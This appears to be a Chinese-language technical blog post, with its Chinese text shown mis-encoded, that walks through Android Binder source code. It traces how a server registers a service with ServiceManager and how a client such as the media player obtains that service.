ServiceManager æ³¨å†ŒæœåŠ¡ //platform\\frameworks\\av\\media\\libmediaplayerservice\\MediaPlayerService.cppvoid MediaPlayerService::instantiate() &#123; defaultServiceManager()->addService( String16(\"media.player\"), new MediaPlayerService());&#125;# defaultServiceManager()-&gt;addService //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppstatus_t ServiceManagerShim::addService(const String16&amp; name, const sp&lt;IBinder>&amp; service, bool allowIsolated, int dumpsysPriority)&#123; Status status = mTheRealServiceManager->addService( String8(name).c_str(), service, allowIsolated, dumpsysPriority); return status.exceptionCode();&#125;è¿™é‡Œä½¿ç”¨äº† mTheRealServiceManager ä¸­çš„ addService æ–¹æ³•ï¼Œé‚£ä¹ˆ mTheRealServiceManager æ˜¯ä»å“ªé‡Œæ¥çš„å‘¢ï¼Ÿ # mTheRealServiceManager //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppusing AidlServiceManager = android::os::IServiceManager;// From the old libbinder IServiceManager interface to IServiceManager.class ServiceManagerShim : public IServiceManager&#123;public: ...private: sp&lt;AidlServiceManager> mTheRealServiceManager;&#125;;ServiceManagerShim::ServiceManagerShim(const sp&lt;AidlServiceManager>&amp; impl) : mTheRealServiceManager(impl)&#123;&#125;ä»è¿™æ®µ ServiceManagerShim ç±»çš„å£°æ˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ° mTheRealServiceManager æ˜¯ android::os::IServiceManager ç±»å‹çš„å®ä¾‹ï¼Œå¹¶ä¸”åœ¨ ServiceManagerShim å®ä¾‹åŒ–æ—¶èµ‹å€¼ è€Œåœ¨ ServiceManager çš„è·å–è¿‡ç¨‹ ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“ ServiceManagerShim æ˜¯åœ¨ defaultServiceManager() ä¸­å®ä¾‹åŒ–çš„ //platform\\frameworks\\native\\libs\\binder\\IServiceManager.cppsp&lt;IServiceManager> defaultServiceManager()&#123; std::call_once(gSmOnce, []() &#123; sp&lt;AidlServiceManager> sm = nullptr; while (sm == nullptr) &#123; // è·å– ServiceManager çš„ BBinder æ‰€å¯¹åº”çš„ BpBinder å¯¹è±¡ï¼Œ // å¹¶å°†è¯¥å¯¹è±¡é€šè¿‡ interface_cast è½¬æ¢ä¸º AidlServiceManager sm = interface_cast&lt;AidlServiceManager>(ProcessState::self()->getContextObject(nullptr)); if (sm == nullptr) &#123; ALOGE(\"Waiting 1s on context object on %s.\", ProcessState::self()->getDriverName().c_str()); sleep(1); &#125; &#125; // å®ä¾‹åŒ– ServiceManagerShim gDefaultServiceManager = sp&lt;ServiceManagerShim>::make(sm); &#125;); return gDefaultServiceManager;&#125;æ‰€ä»¥è¯´ mTheRealServiceManager å…¶å®æ˜¯ BpServiceManager(new BpBinder(0)) , æ³¨å†ŒæœåŠ¡çš„é¡ºåºä¸º BpServiceManager--&gt;BpBinder--&gt;IPCThreadState--&gt;ioctl è€Œ BpServiceManager ç°åœ¨æ˜¯ç”± AIDL è‡ªåŠ¨ç”Ÿæˆï¼Œåœ¨æ¡†æ¶ç¼–è¯‘å®Œæˆä¹‹åçš„ out ç›®å½•ä¸­çš„ BpServiceManager::addService //platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm_armv8-a_shared/gen/aidl/android/os/IServiceManager.cppnamespace android &#123;namespace os &#123;BpServiceManager::BpServiceManager(const ::android::sp&lt;::android::IBinder>&amp; _aidl_impl) : BpInterface&lt;IServiceManager>(_aidl_impl)&#123;//_aidl_impl å°±æ˜¯ BpBinder (0) å®ä¾‹&#125;-------------------------------------------------- ::android::binder::Status BpServiceManager::addService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, bool allowIsolated, int32_t dumpPriority) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong());//0ã€å’Œ Rpc Binder æœ‰å…³ ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; //1ã€å†™ interface _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //2ã€å†™ name _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //3ã€å†™ binder å¯¹è±¡ _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //4ã€å†™ allowIsolated _aidl_ret_status = _aidl_data.writeBool(allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //5ã€å†™ dumpPriority _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //6ã€å€ŸåŠ© BpBinder (0)#transact æ¥å‘èµ· Binder é€šä¿¡ _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_addService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->addService(name, service, allowIsolated, dumpPriority); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //7ã€å¦‚æœæœ‰è¿”å›å€¼å°±ä»è¿™ä¸ª parcel åŒ…é‡Œè¯» _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;è¿™ä¸ªè¿‡ç¨‹ä¸»è¦æ˜¯å€ŸåŠ© BpBinder(0)#transact æ¥å‘èµ· Binder é€šä¿¡ï¼ŒBinder é©±åŠ¨æ ¹æ® handle == 0 æ‰¾åˆ°æˆ‘ä»¬çš„ ServiceManager è¿›ç¨‹ï¼Œå”¤é†’ä»–å¼€å§‹å¤„ç†è¯·æ±‚ã€‚ è¿˜è®°å¾—åœ¨ ServiceManager çš„å¯åŠ¨è¿‡ç¨‹ ä¸­çš„é‚£ä¸ª while å¾ªç¯å‡½æ•°å—ï¼ŸBinderCallback å°±æ˜¯ç”¨æ¥å¤„ç† Binder é©±åŠ¨å‘é€çš„ BR_TRANSACTION ä¿¡å·çš„ //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppint main(int argc, char** argv) &#123; ... // å‡†å¤‡ looper sp&lt;Looper> looper = Looper::prepare(false /*allowNonCallbacks*/); // ç›‘å¬ BC_ENTER_LOOPER ä¿¡å·ï¼Œæ”¶åˆ°è¯¥ä¿¡å·åå›è°ƒå¤„ç† binder è°ƒç”¨ BinderCallback::setupTo(looper); // ç›‘å¬å®¢æˆ·ç«¯å›è°ƒ ClientCallbackCallback::setupTo(looper, manager); // é˜»å¡ç­‰å¾…å’Œå¤„ç†äº‹ä»¶ while(true) &#123; looper->pollAll(-1); &#125; // should not be reached return EXIT_FAILURE;&#125;# BinderCallback BinderCallback::handleEvent è°ƒç”¨äº† IPCThreadState::self()-&gt;handlePolledCommands() æ¥å¤„ç†å‘½ä»¤ //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppclass BinderCallback : public LooperCallback &#123;public: static sp&lt;BinderCallback> setupTo(const sp&lt;Looper>&amp; looper) &#123; sp&lt;BinderCallback> cb = sp&lt;BinderCallback>::make(); int binder_fd = -1; // ç›‘å¬ BC_ENTER_LOOPER ä¿¡å· IPCThreadState::self()->setupPolling(&amp;binder_fd); LOG_ALWAYS_FATAL_IF(binder_fd &lt; 0, \"Failed to setupPolling: %d\", binder_fd); int ret = looper->addFd(binder_fd, Looper::POLL_CALLBACK, Looper::EVENT_INPUT, cb, nullptr /*data*/); LOG_ALWAYS_FATAL_IF(ret != 1, \"Failed to add binder FD to Looper\"); return cb; &#125; int handleEvent(int /* fd */, int /* events */, void* /* data */) override &#123; IPCThreadState::self()->handlePolledCommands(); return 1; // Continue receiving callbacks. &#125;&#125;;# IPCThreadState::handlePolledCommands //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::handlePolledCommands()&#123; status_t result; do &#123; // è·å–å¹¶æ‰§è¡Œå‘½ä»¤ result = getAndExecuteCommand(); &#125; while (mIn.dataPosition() &lt; mIn.dataSize()); processPendingDerefs(); flushCommands(); return result;&#125;# IPCThreadState::getAndExecuteCommand //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::getAndExecuteCommand()&#123; status_t result; int32_t cmd; // å’Œ binder é©±åŠ¨é€šä¿¡ï¼Œè·å–æˆ–ä¼ è¾“æ•°æ® result = talkWithDriver(); if (result >= NO_ERROR) &#123; size_t IN = mIn.dataAvail(); if (IN &lt; sizeof(int32_t)) return result; // è¯»å–å‘½ä»¤ cmd = mIn.readInt32(); IF_LOG_COMMANDS() &#123; alog &lt;&lt; \"Processing top-level Command: \" &lt;&lt; getReturnString(cmd) &lt;&lt; endl; &#125; pthread_mutex_lock(&amp;mProcess->mThreadCountLock); mProcess->mExecutingThreadsCount++; if (mProcess->mExecutingThreadsCount >= mProcess->mMaxThreads &amp;&amp; mProcess->mStarvationStartTimeMs == 0) &#123; mProcess->mStarvationStartTimeMs = uptimeMillis(); &#125; pthread_mutex_unlock(&amp;mProcess->mThreadCountLock); // è§£æå¹¶æ‰§è¡Œå‘½ä»¤ result = executeCommand(cmd); pthread_mutex_lock(&amp;mProcess->mThreadCountLock); mProcess->mExecutingThreadsCount--; if (mProcess->mExecutingThreadsCount &lt; mProcess->mMaxThreads &amp;&amp; mProcess->mStarvationStartTimeMs != 0) &#123; int64_t starvationTimeMs = uptimeMillis() - mProcess->mStarvationStartTimeMs; if (starvationTimeMs > 100) &#123; ALOGE(\"binder thread pool (%zu threads) starved for %\" PRId64 \" ms\", mProcess->mMaxThreads, starvationTimeMs); &#125; mProcess->mStarvationStartTimeMs = 0; &#125; // Cond broadcast can be expensive, so don't send it every time a binder // call is processed. b/168806193 if (mProcess->mWaitingForThreads > 0) &#123; pthread_cond_broadcast(&amp;mProcess->mThreadCountDecrement); &#125; pthread_mutex_unlock(&amp;mProcess->mThreadCountLock); &#125; return result;&#125;# IPCThreadState::executeCommand //platform\\frameworks\\native\\libs\\binder\\IPCThreadState.cppstatus_t IPCThreadState::executeCommand(int32_t cmd)&#123; switch ((uint32_t)cmd) &#123; case BR_TRANSACTION: &#123; // å› ä¸ºç›®çš„ç«¯ SM æ‰€ä»¥ tr.target.ptr ä¸º 0 if (tr.target.ptr) &#123; ... &#125;else &#123;// å¼€å§‹ä¸šåŠ¡åˆ†å‘ error = the_context_object->transact(tr.code, buffer, &amp;reply, tr.flags); &#125;# IPCThreadState::setTheContextObject åœ¨ ServiceManager çš„å¯åŠ¨è¿‡ç¨‹ è¿™èŠ‚çš„å†…å®¹ä¸­ï¼Œæˆ‘ä»¬è®© ServiceManager æˆä¸ºäº†æ•´ä¸ª binder IPC é€šä¿¡ä¸­çš„ä¸Šä¸‹æ–‡ç®¡ç†è€…ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å…¨å±€å˜é‡ the_context_object ä¸­ //platform\\frameworks\\native\\cmds\\servicemanager\\main.cppsp&lt;BBinder> the_context_object;void IPCThreadState::setTheContextObject(const sp&lt;BBinder>&amp; obj)&#123; the_context_object = obj;&#125;int main(int argc, char** argv) &#123; ... // å°† \"manager\" æœåŠ¡ä½œä¸ºæœåŠ¡ç«¯ Bbinder å¯¹è±¡ IPCThreadState::self()->setTheContextObject(manager); // å‘ binder é©±åŠ¨å‘é€ ioctl BINDER_SET_CONTEXT_MGR_EXT ä¿¡å·ï¼Œå°† servicemanager // åœ¨ ProcessState::initWithDriver ä¸­æ‰“å¼€é©±åŠ¨è®¾å¤‡ /dev/driver æ‰€è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦å¥æŸ„ // ä½œä¸ºæ•´ä¸ª binder IPC é€šä¿¡ä¸­çš„ä¸Šä¸‹æ–‡ç®¡ç†è€… ps->becomeContextManager(); ...&#125;# BBinder::transact æ‰€ä»¥ the_context_object-&gt;transact() è°ƒç”¨å°±èµ°åˆ° BBinder çš„ transact //platform\\frameworks\\native\\libs\\binder\\Binder.cpp// NOLINTNEXTLINE(google-default-arguments)status_t BBinder::transact( uint32_t code, const Parcel&amp; data, Parcel* reply, uint32_t flags)&#123; data.setDataPosition(0); if (reply != nullptr &amp;&amp; (flags &amp; FLAG_CLEAR_BUF)) &#123; reply->markSensitive(); &#125; status_t err = NO_ERROR; switch (code) &#123; case PING_TRANSACTION: err = pingBinder(); break; case EXTENSION_TRANSACTION: err = reply->writeStrongBinder(getExtension()); break; case DEBUG_PID_TRANSACTION: err = reply->writeInt32(getDebugPid()); break; default: err = onTransact(code, data, reply, flags); break; &#125; // In case this is being transacted on in the same process. if (reply != nullptr) &#123; reply->setDataPosition(0); &#125; return err;&#125;# BnServiceManager::onTransact ç„¶åå›åˆ°äº†è¿™ä¸ª AIDL è‡ªåŠ¨ç”Ÿæˆçš„ IServiceManager.cpp ä¸­ BnServiceManager çš„ onTransact () æ–¹æ³•é‡Œ //platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; case BnServiceManager::TRANSACTION_addService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; bool in_allowIsolated; int32_t in_dumpPriority; // æ£€æŸ¥ interface if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; // è¯» name _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // è¯» binder _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // è¯» in_allowIsolated _aidl_ret_status = _aidl_data.readBool(&amp;in_allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // è¯» in_dumpPriority _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // è°ƒç”¨çœŸæ­£çš„ ServiceManager.cpp ä¸­çš„å®ç° addService ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)); // å¦‚æœæœ‰è¿”å›å†™è¿”å›åˆ° _aidl_reply _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125;# ServiceManager::addService è¿™é‡Œæ˜¯å’Œ Bp ç«¯æ˜¯å¯¹ç§°çš„æ“ä½œï¼Œä¸‹ä¸€æ­¥èµ°åˆ° ServiceManager.cpp::addService æ–¹æ³• QUESTION? ä¸ºä»€ä¹ˆé€šè¿‡ ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)) å¯ä»¥è°ƒç”¨åˆ° ServiceManager::addService ? //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::addService(const std::string&amp; name, const sp&lt;IBinder>&amp; binder, bool allowIsolated, int32_t dumpPriority) &#123; auto ctx = mAccess->getCallingContext(); // apps cannot add services if (multiuser_get_app_id(ctx.uid) >= AID_APP) &#123; return Status::fromExceptionCode(Status::EX_SECURITY); &#125; if (!mAccess->canAdd(ctx, name)) &#123; return Status::fromExceptionCode(Status::EX_SECURITY); &#125; if (binder == nullptr) &#123; return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125; // æ£€éªŒ Service åç§°çš„åˆæ³•æ€§ï¼Œåç§°é•¿åº¦è¦æ±‚å¤§äº 0 å¹¶å°äºç­‰äº 127 // å­—ç¬¦ä»…åŒ…æ‹¬ [a-z][A-Z][0-9]_-./ if (!isValidServiceName(name)) &#123; LOG(ERROR) &lt;&lt; \"Invalid service name: \" &lt;&lt; name; return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125;#ifndef VENDORSERVICEMANAGER if (!meetsDeclarationRequirements(binder, name)) &#123; // already logged return Status::fromExceptionCode(Status::EX_ILLEGAL_ARGUMENT); &#125;#endif // !VENDORSERVICEMANAGER // implicitly unlinked when the binder is removed // ä¸º binder å¯¹è±¡è®¾ç½®æ­»äº¡ä»£ç† /* åœ¨å’Œ service è¿›è¡Œäº¤äº’æ—¶ï¼Œservice è¿”å›ä¸€ä¸ª Binder å¯¹è±¡ã€‚ Binder æ˜¯å·¥ä½œåœ¨ service ç«¯ï¼Œå¦‚æœï¼Œç”±äºæŸç§åŸå› ï¼ŒæœåŠ¡ç«¯å‡ºç°æ•…éšœè€Œæ­»äº¡ï¼Œ é‚£ä¹ˆè¯¥è¿”å›çš„ Binder å¯¹è±¡ä¹Ÿå°†æ¶ˆå¤±ï¼Œè¿™æ—¶ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯åœ¨ä½¿ç”¨ Binder å¯¹è±¡ è¿›è¡ŒæŸäº›å‡½æ•°è°ƒç”¨å°†ä¼šå‡ºç°é”™è¯¯ã€‚ä¸ºäº†é¿å…è¯¥æƒ…å†µçš„å‘ç”Ÿï¼Œæˆ‘ä»¬å¯ä»¥ä¸º Binder å¯¹è±¡è®¾ç½®æ­»äº¡ä»£ç† (linkToDeath)ã€‚å½“å‡ºç°å’ŒæœåŠ¡ç«¯è¿æ¥å‘ç”Ÿæ•…éšœæ—¶ï¼Œ ç³»ç»Ÿå°†è‡ªåŠ¨è°ƒç”¨æ­»äº¡ä»£ç†å‡½æ•° binderDied ()ã€‚ */ if (binder->remoteBinder() != nullptr &amp;&amp; binder->linkToDeath(sp&lt;ServiceManager>::fromExisting(this)) != OK) &#123; LOG(ERROR) &lt;&lt; \"Could not linkToDeath when adding \" &lt;&lt; name; return Status::fromExceptionCode(Status::EX_ILLEGAL_STATE); &#125; // Overwrite the old service if it exists // æ·»åŠ æœåŠ¡ï¼Œä»¥ name ä½œä¸ºç´¢å¼•å€¼ï¼Œä½¿ç”¨ binder ä½œä¸ºå‚æ•°å®ä¾‹åŒ– Service å¯¹è±¡ mNameToService[name] = Service &#123; .binder = binder, .allowIsolated = allowIsolated, .dumpPriority = dumpPriority, .debugPid = ctx.debugPid, &#125;; /* æ£€æŸ¥æœåŠ¡æ³¨å†Œçš„åˆæ³•æ€§ï¼ŒåŒ…æ‹¬ 1. æœåŠ¡æ˜¯å¦å­˜åœ¨ 2. è¯¥æœåŠ¡æ˜¯å¦æ˜¯æœåŠ¡ç«¯æ³¨å†Œçš„ 3. æ˜¯å¦æœ‰åŒåæœåŠ¡å­˜åœ¨ 4. ä¸ºè¯¥æœåŠ¡æ³¨å†Œçš„æ­»äº¡ä»£ç†æ˜¯å¦æˆåŠŸ */ auto it = mNameToRegistrationCallback.find(name); if (it != mNameToRegistrationCallback.end()) &#123; for (const sp&lt;IServiceCallback>&amp; cb : it->second) &#123; mNameToService[name].guaranteeClient = true; // permission checked in registerForNotifications cb->onRegistration(name, binder); &#125; &#125; return Status::ok();&#125;# æ€»ç»“ Server æƒ³è¦å‘ ServiceManager æ³¨å†ŒæœåŠ¡ï¼Œé¦–å…ˆé€šè¿‡ defaultServiceManager è·å–åˆ°ä¸€ä¸ª Service Manager çš„ä»£ç†å¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨å®ƒçš„æˆå‘˜å‡½æ•° addService å°†è¯¥ Service ç»„ä»¶æ³¨å†Œåˆ° Service Manager ä¸­ï¼Œè¯¥ä»£ç†å¯¹è±¡é€šè¿‡å‘ Binder é©±åŠ¨è®¾å¤‡å‘é€ BC_TRANSACTION ä¿¡å·å’Œ Service Manager é€šä¿¡ï¼Œåœ¨ Service Manager å¯åŠ¨ä¹‹åä¼šè¿›å…¥ä¸€ä¸ªé˜»å¡çš„æ— é™å¾ªç¯ï¼Œ Service Manager é€šè¿‡ BinderCallback å›è°ƒå‡½æ•°å¤„ç† Binder é©±åŠ¨è®¾å¤‡è¿”å›çš„ BR_TRANSACTION , è°ƒç”¨ BBinder çš„ transact æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°†ä¼šæŠŠæˆ‘ä»¬å¼•åˆ° BnServiceManager çš„ onTransact () æ–¹æ³•ï¼Œç»ˆäºè¿™ä¸ªæ–¹æ³•å°†æˆ‘ä»¬å¸¦åˆ°äº†çœŸæ­£æ·»åŠ æœåŠ¡çš„æ–¹æ³• ServiceManager.cpp::addService, å¹¶å‘ mNameToService å­—å…¸ä¸­æ·»åŠ  name: Service çš„é”®å€¼å¯¹ï¼Œæ¥ä¸º Client å‘ ServiceManager è·å–æœåŠ¡çš„è¿‡ç¨‹åšæ•°æ®å‡†å¤‡. # Client å‘ ServiceManager è·å–æœåŠ¡ è¿™é‡Œä»¥ MediaServer ä¸ºä¾‹æ¥åˆ†æ Client å‘ ServiceManager è·å–æœåŠ¡çš„è¿‡ç¨‹ // android-platform\\frameworks\\av\\media\\libmedia\\IMediaDeathNotifier.cpp// establish binder interface to MediaPlayerService/*static*/const sp&lt;IMediaPlayerService>IMediaDeathNotifier::getMediaPlayerService()&#123; ALOGV(\"getMediaPlayerService\"); Mutex::Autolock _l(sServiceLock); if (sMediaPlayerService == 0) &#123; sp&lt;IServiceManager> sm = defaultServiceManager(); sp&lt;IBinder> binder; do &#123; binder = sm->getService(String16(\"media.player\"));// æ ¸å¿ƒå‡½æ•°ï¼Œè·å–åä¸º media.player çš„æœåŠ¡ï¼Œå› ä¸ºåœ¨ä¹‹å‰ Server å·²ç»å‘ ServiceManager æ³¨å†Œè¿‡äº† if (binder != 0) &#123; break; &#125; ALOGW(\"Media player service not published, waiting...\"); usleep(500000); // 0.5 s ä¸€ä¸ªæ— é™å¾ªç¯æ¯ 0.5 ç§’å°±è·å–ä¸€æ¬¡æœåŠ¡ï¼ŒçŸ¥é“è·å–åˆ°æƒé™ &#125; while (true); if (sDeathNotifier == NULL) &#123; sDeathNotifier = new DeathNotifier();//Service æ­»äº¡ååˆ›å»ºæ­»äº¡é€šçŸ¥ &#125; binder->linkToDeath(sDeathNotifier); sMediaPlayerService = interface_cast&lt;IMediaPlayerService>(binder); &#125; ALOGE_IF(sMediaPlayerService == 0, \"no media player service!?\"); return sMediaPlayerService;&#125;# ServiceManagerShim::getService è¿™é‡Œè°ƒç”¨ ServiceManagerShim::checkService æ¥å¯»æ‰¾ä»¥æ³¨å†Œçš„æœåŠ¡ //android-platform\\frameworks\\native\\libs\\binder\\IServiceManager.cpp// This implementation could be simplified and made more efficient by delegating// to waitForService. However, this changes the threading structure in some// cases and could potentially break prebuilts. Once we have higher logistical// complexity, this could be attempted.sp&lt;IBinder> ServiceManagerShim::getService(const String16&amp; name) const&#123; static bool gSystemBootCompleted = false; sp&lt;IBinder> svc = checkService(name);// æ£€æŸ¥ä¸€ä¸‹æŒ‡å®šçš„æœåŠ¡åç§°æ˜¯å¦å­˜åœ¨ if (svc != nullptr) return svc;// æ‰¾åˆ°äº† ç›´æ¥è¿”å› //verder è¿›ç¨‹æœåŠ¡è·å–é€»è¾‘ï¼Œè¿™é‡Œä¸åšåˆ†æ const bool isVendorService = strcmp(ProcessState::self()->getDriverName().c_str(), \"/dev/vndbinder\") == 0; constexpr int64_t timeout = 5000; int64_t startTime = uptimeMillis(); // Vendor code can't access system properties if (!gSystemBootCompleted &amp;&amp; !isVendorService) &#123;#ifdef __ANDROID__ char bootCompleted[PROPERTY_VALUE_MAX]; property_get(\"sys.boot_completed\", bootCompleted, \"0\"); gSystemBootCompleted = strcmp(bootCompleted, \"1\") == 0 ? true : false;#else gSystemBootCompleted = true;#endif &#125; // retry interval in millisecond; note that vendor services stay at 100ms const useconds_t sleepTime = gSystemBootCompleted ? 1000 : 100; ALOGI(\"Waiting for service '%s' on '%s'...\", String8(name).string(), ProcessState::self()->getDriverName().c_str()); int n = 0; while (uptimeMillis() - startTime &lt; timeout) &#123; n++; usleep(1000*sleepTime); sp&lt;IBinder> svc = checkService(name); if (svc != nullptr) &#123; ALOGI(\"Waiting for service '%s' on '%s' successful after waiting %\" PRIi64 \"ms\", String8(name).string(), ProcessState::self()->getDriverName().c_str(), uptimeMillis() - startTime); return svc; &#125; &#125; ALOGW(\"Service %s didn't start. Returning NULL\", String8(name).string()); return nullptr;&#125;# ServiceManagerShim::checkService è¿™é‡Œå’Œ Server å‘ ServiceManager æ³¨å†ŒæœåŠ¡ä¸€èŠ‚å¼€å¤´ä¸­çš„å½¢å¼ä¸€æ ·ï¼Œä¹Ÿæ˜¯é€šè¿‡ mTheRealServiceManager æ¥æ‰§è¡Œæ ¸å¿ƒçš„è·å–æœåŠ¡é€»è¾‘ï¼Œå¯¹è¯¥å˜é‡çš„èµ‹å€¼äºåˆ†æå¯å‚é˜… mTheRealServiceManager sp&lt;IBinder> ServiceManagerShim::checkService(const String16&amp; name) const&#123; sp&lt;IBinder> ret; if (!mTheRealServiceManager->checkService(String8(name).c_str(), &amp;ret).isOk()) &#123; return nullptr; &#125; return ret;&#125;# BpServiceManager::checkService åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ä»å®‰å“æ¡†æ¶ç¼–è¯‘ä¹‹åçš„è¾“å…¥æ–‡ä»¶ä¸­æ‰¾åˆ°ç”±æ¨¡æ¿ aidl ç”Ÿæˆçš„ IServiceManager.cpp ///android-platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm64_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp::android::binder::Status BpServiceManager::checkService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; //1. å†™ interface _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; //2. å°†è¦æŸ¥è¯¢çš„ Service name å†™å…¥ _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; // å€ŸåŠ© BpBinder (0)#transact æ¥å‘èµ· Binder é€šä¿¡ _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_checkService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->checkService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;# BnServiceManager::onTransact ä¸ Serverå‘ServiceManageræ³¨å†ŒæœåŠ¡ ä¸­ç›¸ç±»ä¼¼ï¼Œ BpBinder(0)#transact æ¥å‘èµ· Binder é€šä¿¡åï¼ŒBinderCallback å¤„ç† Binder é©±åŠ¨å‘é€çš„ BR_TRANSACTION ä¿¡å·ï¼Œå¹¶äº¤ç”± IPCThreadState::self()-&gt;handlePolledCommands() æ¥å¤„ç†å‘½ä»¤ï¼Œæœ€ç»ˆæ¥åˆ°ç”± aidl ç”Ÿæˆçš„ aidl/android/os/IServiceManager.cpp çš„ BnServiceManager::onTransact å»æ‰§è¡Œå‘½ä»¤ï¼Œä¸ ServiceManager é€šè¿‡ Binder é€šä¿¡ ::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; ... case BnServiceManager::TRANSACTION_checkService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; // å†™å…¥è¦æŸ¥è¯¢çš„åç§° _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; // è°ƒç”¨çœŸæ­£çš„ ServiceManager.cpp ä¸­çš„å®ç° addService ::android::binder::Status _aidl_status(checkService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; ... if (_aidl_ret_status == ::android::UNEXPECTED_NULL) &#123; _aidl_ret_status = ::android::binder::Status::fromExceptionCode(::android::binder::Status::EX_NULL_POINTER).writeToParcel(_aidl_reply); &#125; return 